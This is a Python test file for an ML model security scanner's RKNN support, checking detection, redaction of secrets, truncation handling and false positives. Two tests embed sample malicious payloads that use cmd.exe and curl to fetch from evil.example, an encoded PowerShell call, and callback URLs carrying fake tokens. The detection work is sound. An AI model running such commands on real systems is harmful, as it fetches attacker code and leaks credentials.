"""Tests for RKNN scanner support."""

from __future__ import annotations

from pathlib import Path

from modelaudit import core
from modelaudit.scanners.base import INCONCLUSIVE_SCAN_OUTCOME, CheckStatus, IssueSeverity
from modelaudit.scanners.rknn_scanner import RknnScanner


def _write_rknn_file(tmp_path: Path, payload: bytes, filename: str = "model.rknn") -> Path:
    path = tmp_path / filename
    path.write_bytes(payload)
    return path


def test_can_handle_valid_rknn_file(tmp_path: Path) -> None:
    payload = b"RKNN\x01\x00\x00\x00model_name=resnet50\nruntime=rockchip\ninput=224x224\n"
    path = _write_rknn_file(tmp_path, payload)

    assert RknnScanner.can_handle(str(path))


def test_can_handle_rejects_non_rknn_content(tmp_path: Path) -> None:
    path = _write_rknn_file(tmp_path, b"not-rknn-binary-content", filename="fake.rknn")

    assert not RknnScanner.can_handle(str(path))


def test_scan_benign_rknn_no_critical_findings(tmp_path: Path) -> None:
    payload = (
        b"RKNN\x01\x00\x00\x00"
        b"model_name=resnet50\n"
        b"model_version=1.0\n"
        b"runtime=rockchip\n"
        b"target=rk3588\n"
        b"quantization=int8\n"
    )
    path = _write_rknn_file(tmp_path, payload, filename="safe.rknn")

    result = RknnScanner().scan(str(path))

    critical_checks = [check for check in result.checks if check.severity == IssueSeverity.CRITICAL]
    assert len(critical_checks) == 0


def test_scan_detects_correlated_command_and_network_indicators(tmp_path: Path) -> None:
    payload = (
        b"RKNN\x01\x00\x00\x00"
        b"notes=cmd.exe /c curl https://evil.example/payload && powershell -enc AAAA\n"
        b"callback=http://198.51.100.5:8080/collect\n"
    )
    path = _write_rknn_file(tmp_path, payload, filename="malicious.rknn")

    result = RknnScanner().scan(str(path))

    correlated = [
        check
        for check in result.checks
        if check.name == "RKNN Command and Network Indicator Correlation" and check.status == CheckStatus.FAILED
    ]
    assert len(correlated) == 1
    assert correlated[0].severity == IssueSeverity.CRITICAL


def test_rknn_redacts_sensitive_evidence_in_findings(tmp_path: Path) -> None:
    payload = (
        b"RKNN\x01\x00\x00\x00"
        b"callback=https://user:secretpass@evil.example/collect?access_token=tok_12345\n"
        b'notes=cmd.exe /c curl -H "Authorization: Bearer sk-testsecret1234567890" '
        b"https://evil.example/payload?api_key=key_12345\n"
    )
    path = _write_rknn_file(tmp_path, payload, filename="redacted.rknn")

    result = RknnScanner().scan(str(path))

    path_reference = [
        check
        for check in result.checks
        if check.name == "RKNN Path Reference Validation" and check.status == CheckStatus.FAILED
    ]
    correlated = [
        check
        for check in result.checks
        if check.name == "RKNN Command and Network Indicator Correlation" and check.status == CheckStatus.FAILED
    ]
    assert len(path_reference) == 1
    assert len(correlated) == 1

    details = repr(path_reference[0].details) + repr(correlated[0].details)
    assert "secretpass" not in details
    assert "tok_12345" not in details
    assert "sk-testsecret" not in details
    assert "key_12345" not in details
    assert "evil.example" in details
    assert "curl" in details
    assert "<redacted>" in details


def test_scan_handles_truncated_rknn_gracefully(tmp_path: Path) -> None:
    path = _write_rknn_file(tmp_path, b"RKNN", filename="truncated.rknn")

    result = RknnScanner().scan(str(path))
    structural_failures = [check for check in result.checks if check.name == "RKNN Structural Integrity"]
    assert len(structural_failures) == 1
    assert structural_failures[0].status == CheckStatus.FAILED
    assert result.success is False


def test_scan_bounded_rknn_window_is_inconclusive(tmp_path: Path) -> None:
    payload = b"RKNN\x01\x00\x00\x00model_name=resnet50\nruntime=rockchip\n" + (b"safe\n" * 40)
    path = _write_rknn_file(tmp_path, payload, filename="bounded.rknn")

    result = RknnScanner(config={"rknn_max_scan_bytes": 32}).scan(str(path))

    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "rknn_bounded_read_incomplete" in result.metadata["scan_outcome_reasons"]


def test_regression_rknn_routes_to_dedicated_scanner(tmp_path: Path) -> None:
    path = _write_rknn_file(tmp_path, b"RKNN\x01\x00\x00\x00model_name=demo\nruntime=rockchip\n")

    result = core.scan_file(str(path))
    assert result.scanner_name == "rknn"
    assert result.scanner_name != "unknown"


def test_false_positive_high_entropy_blob_is_not_critical(tmp_path: Path) -> None:
    high_entropy_like = b"A" * 220 + b"\nmetadata=benchmark\n"
    path = _write_rknn_file(tmp_path, b"RKNN\x01\x00\x00\x00" + high_entropy_like, filename="entropy.rknn")

    result = RknnScanner().scan(str(path))
    critical_checks = [check for check in result.checks if check.severity == IssueSeverity.CRITICAL]
    assert len(critical_checks) == 0


def test_false_positive_common_labels_do_not_trigger_command_alert(tmp_path: Path) -> None:
    payload = b"RKNN\x01\x00\x00\x00label=execute_mode_fast\ndescription=network_ready_model\nruntime=rockchip\n"
    path = _write_rknn_file(tmp_path, payload, filename="labels.rknn")

    result = RknnScanner().scan(str(path))
    command_failures = [
        check
        for check in result.checks
        if check.name in {"RKNN Command Indicator Detection", "RKNN Command and Network Indicator Correlation"}
        and check.status == CheckStatus.FAILED
    ]
    assert len(command_failures) == 0
